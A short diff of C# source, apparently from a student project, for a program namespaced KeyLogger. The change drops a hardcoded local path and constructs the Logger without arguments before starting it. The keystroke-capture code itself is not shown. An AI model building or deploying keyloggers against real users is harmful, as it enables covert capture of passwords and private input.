@@ -12,8 +12,7 @@ namespace KeyLogger
     {
         static void Main(string[] args)
         {
-            string filePath = @"C:\Users\lukas\Documents\skola\20-21\PVBPS\";
-            Logger keyLogger = new Logger(filePath);
+            Logger keyLogger = new Logger();
             keyLogger.Start();
         }
     }
